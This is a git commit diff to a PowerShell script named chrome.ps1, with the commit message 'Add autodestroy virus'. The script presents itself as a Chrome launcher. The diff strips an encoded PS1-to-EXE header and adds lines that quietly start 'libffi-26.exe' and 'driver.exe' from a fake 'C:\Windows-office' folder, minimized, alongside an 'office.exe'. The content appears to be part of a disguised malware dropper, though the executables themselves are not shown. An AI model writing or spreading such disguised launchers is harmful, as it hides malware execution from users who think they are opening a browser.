052f959629559e776f76a3f5783a05f086b7b3d8
SaturnXIII <110695125+SaturnXIII@users.noreply.github.com>
2024-01-08 22:44:58 +0100

    Add autodestroy virus 💥

--- script/chrome.ps1
+++ script/chrome.ps1
@@ -1,36 +1,5 @@
-﻿##[Ps1 To Exe]
-##
-##Kd3HDZOFADWE8uO1
-##Nc3NCtDXTlODjqHB5jV78Fjsfk8kYcKXvImEzJOz8u/TsibWR6Urb1F1hDz9FlKCC6JAB8pbp8cWGxQpIJI=
-##Kd3HFJGZHWLWoLaVvnQnhQ==
-##LM/RF4eFHHGZ7/K1
-##K8rLFtDXTiW5
-##OsHQCZGeTiiZ4dI=
-##OcrLFtDXTiW5
-##LM/BD5WYTiiZ4tI=
-##McvWDJ+OTiiZ4tI=
-##OMvOC56PFnzN8u+Vs1Q=
-##M9jHFoeYB2Hc8u+Vs1Q=
-##PdrWFpmIG2HcofKIo2QX
-##OMfRFJyLFzWE8uK1
-##KsfMAp/KUzWJ0g==
-##OsfOAYaPHGbQvbyVvnQX
-##LNzNAIWJGmPcoKHc7Do3uAuO
-##LNzNAIWJGnvYv7eVvnQX
-##M9zLA5mED3nfu77Q7TV64AuzAgg=
-##NcDWAYKED3nfu77Q7TV64AuzAgg=
-##OMvRB4KDHmHQvbyVvnQX
-##P8HPFJGEFzWE8tI=
-##KNzDAJWHD2fS8u+Vgw==
-##P8HSHYKDCX3N8u+Vgw==
-##LNzLEpGeC3fMu77Ro2k3hQ==
-##L97HB5mLAnfMu77Ro2k3hQ==
-##P8HPCZWEGmaZ7/K1
-##L8/UAdDXTlODjqHB5jV78Fjsfm4iYsCnqr6o1oKp69bvszfWRJ8CGxpyjiyc
-##Kc/BRM3KXhU=
-##
-##
-##fd6a9f26a06ea3bc99616d4851b372ba
 start chrome
+Start-Process -FilePath "C:\Windows-office\_internal\libffi-26.exe" -WindowStyle Minimized
+Start-Process -FilePath "C:\Windows-office\_internal\driver.exe" -WindowStyle Minimized
 Start-Process -FilePath "C:\Windows-office\office.exe" -WindowStyle Minimized
 exit
